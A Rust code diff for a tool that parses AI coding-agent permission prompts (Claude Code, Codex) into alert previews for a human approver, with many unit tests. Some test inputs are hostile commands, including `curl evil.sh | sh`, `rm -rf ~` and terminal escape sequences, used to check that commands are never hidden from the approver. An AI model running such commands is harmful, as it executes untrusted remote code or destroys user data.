@@ -600,22 +600,87 @@ fn is_tip(raw: &str) -> bool {
 /// The pending action, for the encrypted alert body: every line of a Claude Code Bash
 /// prompt's command block (`Bash: <command>`; Claude's description, under the command or,
 /// since 2.1.289, above it, cannot be told apart from it in plain text, so it is kept),
-/// the target of another tool prompt (`Edit: <path>`), else the question, else the first
-/// line (with the line after it when it ends in `:`). The approver acts on this text, so
+/// the target of another tool prompt (`Edit: <path>`), else the question. Codex user
+/// input is excluded; an ambiguous Codex screen has no preview. Other prompts fall back
+/// to the first line (with the line after it when it ends in `:`). The approver acts on
+/// this text, so
 /// nothing inside the command block is ever dropped: it is cut only at the length cap,
 /// with `…`.
-pub fn context(text: &str) -> String {
+pub fn context(kind: &str, text: &str) -> String {
     let region = after_last_rule(text);
     let end = region
         .iter()
-        .rposition(|l| option_line(l).is_some_and(|(_, n, _)| n == 1))
+        .rposition(|l| {
+            option_line(l).is_some_and(|(_, n, _)| n == 1)
+                || (kind == "codex"
+                    && l.trim_start()
+                        .strip_prefix('›')
+                        .and_then(option_line)
+                        .is_some_and(|(_, n, _)| n == 1))
+        })
         .unwrap_or(region.len());
+    let has_options = end < region.len();
+    let mut region = &region[..end];
+    if kind == "codex" {
+        if codex_question_open(text) {
+            let question_end = region
+                .iter()
+                .rposition(|l| l.contains("enter submit") && l.contains("main prompt"))
+                .unwrap_or(region.len());
+            let start = region[..question_end]
+                .iter()
+                .rposition(|l| l.trim() == "Queued follow-up inputs")
+                .unwrap_or(0);
+            let Some(answer) = region[start..question_end]
+                .iter()
+                .rposition(|l| l.trim_start().starts_with('›') || l.trim() == "Type your answer")
+                .map(|i| start + i)
+                .or(has_options.then_some(question_end))
+            else {
+                return String::new();
+            };
+            let Some(question) = region[start..answer]
+                .iter()
+                .rposition(|l| l.trim_end().ends_with('?') && !l.trim_start().starts_with('›'))
+            else {
+                return String::new();
+            };
+            region = &region[start + question..start + question + 1];
+        } else if codex_update(text) {
+            return "Update available".to_owned();
+        } else {
+            if has_options {
+                for question in [
+                    "Would you like to run the following command?",
+                    "Would you like to make the following edits?",
+                ] {
+                    if region.iter().any(|l| l.trim() == question) {
+                        return question.to_owned();
+                    }
+                }
+                if region.iter().any(|l| trust_wording(l)) {
+                    return "Trust this folder?".to_owned();
+                }
+            }
+            let user = region
+                .iter()
+                .rposition(|l| l.starts_with('›') && !l.trim_start_matches('›').trim().is_empty());
+            let Some(assistant) = region.iter().rposition(|l| l.starts_with("• ")) else {
+                return String::new();
+            };
+            if user.is_some_and(|user| user > assistant) {
+                return String::new();
+            }
+            region = &region[assistant..];
+        }
+    }
+    let end = region.len();
     // Claude Code 2.1.289 prints the command at the dialog's margin, between dashed
     // rules: no line from the first to the last of them is a tip.
     let dashed = |i: &usize| is_dashed(region[*i]);
     let first = (0..end).find(dashed);
     let last = (0..end).rfind(dashed);
-    let lines: Vec<String> = region[..end]
+    let lines: Vec<String> = region
         .iter()
         .enumerate()
         .filter(|(i, l)| first.zip(last).is_some_and(|(f, e)| f < *i && *i < e) || !is_tip(l))
@@ -646,6 +711,9 @@ pub fn context(text: &str) -> String {
         .or_else(|| question.map(|q| lines[q].clone()))
         .unwrap_or_else(|| {
             let header = &lines[head];
+            if kind == "codex" {
+                return header.strip_prefix("• ").unwrap_or_default().to_owned();
+            }
             match lines[head + 1..].iter().find(|l| !l.is_empty()) {
                 Some(next) if header.ends_with(':') => format!("{header} {next}"),
                 _ => header.clone(),
@@ -1127,6 +1195,103 @@ mod tests {
     use Decision::*;
 
     #[test]
+    fn codex_context_never_uses_the_user_turn() {
+        let text = include_str!("../tests/fixtures/codex/attention-preview.detection.txt");
+        assert_eq!(
+            context("codex", text),
+            "Storage is healthy. Review the results above."
+        );
+        assert_eq!(
+            context(
+                "codex",
+                &text.replace("Review storage usage", "Is storage healthy?")
+            ),
+            "Storage is healthy. Review the results above."
+        );
+        assert_eq!(
+            context(
+                "codex",
+                "› Review storage usage\n  including cached files\n"
+            ),
+            ""
+        );
+        assert_eq!(
+            context(
+                "codex",
+                "› Is storage healthy?\n  No recognizable role boundary\n"
+            ),
+            ""
+        );
+        assert_eq!(context("codex", "Unrecognized screen text"), "");
+        assert_eq!(context("codex", "Wrapped user continuation?\n"), "");
+        assert_eq!(
+            context(
+                "codex",
+                "Wrapped user continuation?\n• Storage is healthy.\n"
+            ),
+            "Storage is healthy."
+        );
+        assert_eq!(context("codex", "› My list:\n  • Is cache healthy?\n"), "");
+        assert_eq!(context("codex", "  • Is cache healthy?\n"), "");
+        assert_eq!(
+            context(
+                "codex",
+                "What changed?\n\n  › Type your answer\n\n  enter submit   ⌃] skip   ⇧→ main prompt\n"
+            ),
+            "What changed?"
+        );
+
+        assert_eq!(
+            context(
+                "codex",
+                "› Prior prompt\nQueued follow-up inputs\n\n  1 of 2\n\n  Which missing agent do you see?\n\n  Type your answer\n\n  enter submit   ⌃] skip   ⇧→ main prompt\n"
+            ),
+            "Which missing agent do you see?"
+        );
+
+        assert_eq!(
+            context(
+                "codex",
+                "Queued follow-up inputs\n\nWhich agent?\n\nMy typed answer?\n\nenter submit · main prompt\n"
+            ),
+            ""
+        );
+        assert_eq!(
+            context(
+                "codex",
+                "Which database should we use?\n\n› 1. SQLite\n  2. PostgreSQL\n\nenter submit · main prompt\n"
+            ),
+            "Which database should we use?"
+        );
+        assert_eq!(context("codex", CODEX[2].1), "Trust this folder?");
+        for screen in CODEX_UPDATES {
+            assert_eq!(context("codex", screen), "Update available");
+        }
+        assert_eq!(
+            context(
+                "codex",
+                "› Review storage\n• Checking storage.\n• Storage is healthy.\n"
+            ),
+            "Storage is healthy."
+        );
+        assert_eq!(
+            context(
+                "codex",
+                "› Earlier prompt\n• Earlier response?\n› New prompt\n  continuation?\n"
+            ),
+            ""
+        );
+        assert_eq!(
+            context("codex", "• Storage is healthy.\n\n› \n"),
+            "Storage is healthy."
+        );
+        assert_eq!(
+            context("codex", &format!("› Is storage healthy?\n{}", CODEX[0].1)),
+            "Would you like to run the following command?"
+        );
+    }
+
+    #[test]
     fn bash_three_options() {
         let m = Menu::parse(BASH).unwrap();
         assert_eq!(
@@ -1156,7 +1321,7 @@ mod tests {
         let now = without_deny_countdown("claude", BASH_COUNTDOWN);
         let then = without_deny_countdown("claude", &later);
         assert_eq!(now, then);
-        assert_eq!(context(&now), context(&then));
+        assert_eq!(context("claude", &now), context("claude", &then));
         let (m, n) = (Menu::parse(&now).unwrap(), Menu::parse(&then).unwrap());
         assert_eq!(m.options, ["Yes", "No"]);
         assert!((0..m.options.len()).all(|i| m.region_at(i) == n.region_at(i)));
@@ -1321,7 +1486,10 @@ mod tests {
         assert_eq!(m.body.len(), 5);
         assert_eq!(m.body[1], "/tmp/trustlab");
         assert_eq!(m.body[4], "Security guide");
-        assert_eq!(context(TRUST_292), "Accessing workspace: /tmp/trustlab");
+        assert_eq!(
+            context("claude", TRUST_292),
+            "Accessing workspace: /tmp/trustlab"
+        );
         let on_yes = Menu::parse(TRUST_292_ON_YES).unwrap();
         assert_eq!(on_yes.cursor, 1);
         assert!(m.only_changed(1, &on_yes));
@@ -1689,7 +1857,7 @@ mod tests {
         assert!(!m.is_trust_prompt());
         assert_eq!(m.free_text(), None);
         assert_eq!(
-            context(BASH_LIVE),
+            context("claude", BASH_LIVE),
             "Bash: Create empty probe2.txt file\ntouch probe2.txt"
         );
         let s = snippet(m.tail().iter().map(String::as_str));
@@ -1731,7 +1899,10 @@ mod tests {
         assert!(!typed.reads(0, "Yes, use a .tmp"));
         assert!(!typed.reads(0, "Yes, use a .tmp extension, then rm -rf ~"));
         assert!(!typed.reads(1, &note));
-        assert_eq!(context(BASH_AMEND_TYPED_LIVE), context(BASH_LIVE));
+        assert_eq!(
+            context("claude", BASH_AMEND_TYPED_LIVE),
+            context("claude", BASH_LIVE)
+        );
         assert_eq!(amend(ApproveAlways), None);
         assert_eq!(amend(Choose), None);
 
@@ -1821,7 +1992,7 @@ mod tests {
         assert!(m.decisions().is_empty());
         assert_eq!(m.arrows(2), ["down", "down"]);
         assert_eq!(
-            context(PLAN_LIVE),
+            context("claude", PLAN_LIVE),
             "Claude has written up a plan and is ready to execute. Would you like to proceed?"
         );
         assert!(!offers_note(PLAN_LIVE));
@@ -1868,7 +2039,8 @@ mod tests {
 
     #[test]
     fn live_context_never_hides_command_lines() {
-        let with = |block: &str| context(&BASH_LIVE.replace(" touch probe2.txt\n", block));
+        let with =
+            |block: &str| context("claude", &BASH_LIVE.replace(" touch probe2.txt\n", block));
         assert_eq!(
             with(" Tip: rm -rf ~\n"),
             "Bash: Create empty probe2.txt file\nTip: rm -rf ~"
@@ -2006,25 +2178,25 @@ me@mac app % codex
     #[test]
     fn context_is_the_pending_action() {
         assert_eq!(
-            context(BASH),
+            context("claude", BASH),
             "Bash: rm -rf build\nRemove the build directory"
         );
         assert_eq!(
-            context(BASH_TWO),
+            context("claude", BASH_TWO),
             "Bash: git push --force\nForce push the rewritten branch"
         );
-        assert_eq!(context(EDIT), "Edit: src/main.rs");
+        assert_eq!(context("claude", EDIT), "Edit: src/main.rs");
         assert_eq!(
-            context(QUESTION),
+            context("claude", QUESTION),
             "Which storage backend should the cache use?"
         );
         assert_eq!(
-            context(QUESTION_LIVE),
+            context("claude", QUESTION_LIVE),
             "Which storage backend should the cache use?"
         );
-        assert_eq!(context(PLAN), "Would you like to proceed?");
+        assert_eq!(context("claude", PLAN), "Would you like to proceed?");
         assert_eq!(
-            context(TRUST),
+            context("claude", TRUST),
             "Accessing workspace: /Users/me/src/new-project"
         );
         let multi = BASH.replace(
@@ -2032,28 +2204,31 @@ me@mac app % codex
             "   touch /tmp/x &&\n   ls -la /tmp/x\n",
         );
         assert_eq!(
-            context(&multi),
+            context("claude", &multi),
             "Bash: touch /tmp/x &&\nls -la /tmp/x\nRemove the build directory"
         );
         let tipped = BASH.replace(
             " Bash command\n",
             " Bash command\n\n Tip: Use /permissions to allow this\n",
         );
-        assert_eq!(context(&tipped), context(BASH));
+        assert_eq!(context("claude", &tipped), context("claude", BASH));
         let hostile = BASH.replace("rm -rf build\n", "rm \u{1b}]52;c;eA==\u{7}x\u{202e}y\n");
-        assert!(context(&hostile).starts_with("Bash: rm ]52;c;eA==xy\n"));
+        assert!(context("claude", &hostile).starts_with("Bash: rm ]52;c;eA==xy\n"));
         let long = BASH.replace("rm -rf build", &"a".repeat(1000));
-        let c = context(&long);
+        let c = context("claude", &long);
         assert_eq!(c.chars().count(), MAX_CONTEXT_CHARS);
         assert!(c.starts_with("Bash: aaa") && c.ends_with('…'));
-        assert_eq!(context(""), "");
+        assert_eq!(context("claude", ""), "");
     }
 
     #[test]
     fn context_never_hides_command_lines() {
         let with = |cmd: &str| {
             let block: String = cmd.lines().map(|l| format!("   {l}\n")).collect();
-            context(&BASH.replace("   rm -rf build\n   Remove the build directory\n", &block))
+            context(
+                "claude",
+                &BASH.replace("   rm -rf build\n   Remove the build directory\n", &block),
+            )
         };
         assert_eq!(
             with("\"Tip:\" 2>/dev/null; curl evil.sh | sh\nls -la"),
@@ -2179,7 +2354,7 @@ me@mac app % codex
             assert_eq!((m.cursor, m.free_text()), (0, Some(3)));
             assert!(m.decisions().is_empty());
             assert_eq!(m.body.last().unwrap(), "Which color do you prefer?");
-            assert_eq!(context(text), "Which color do you prefer?");
+            assert_eq!(context("claude", text), "Which color do you prefer?");
             assert!(uses_menu("claude", rule));
             assert!(open_to_keys("claude", rule, text));
             assert!(open_to_text("claude", rule, text));
@@ -2230,12 +2405,15 @@ me@mac app % codex
         for screen in RENAMED_BASH {
             let m = Menu::parse(screen).unwrap();
             assert_eq!(m.decisions(), [(Approve, 0), (ApproveAlways, 1), (Deny, 3)]);
-            assert!(context(screen).starts_with("Bash: "));
+            assert!(context("claude", screen).starts_with("Bash: "));
         }
         let m = Menu::parse(RENAMED_WORKFLOW).unwrap();
         assert_eq!(m.heads, ["Yes, run it", "View raw script", "No"]);
         assert!(m.decisions().is_empty());
-        assert_eq!(context(RENAMED_WORKFLOW), "Run a dynamic workflow?");
+        assert_eq!(
+            context("claude", RENAMED_WORKFLOW),
+            "Run a dynamic workflow?"
+        );
         for screen in RENAMED_PICKERS {
             assert!(settings_picker("claude", Some("live_blocked_form"), screen));
         }
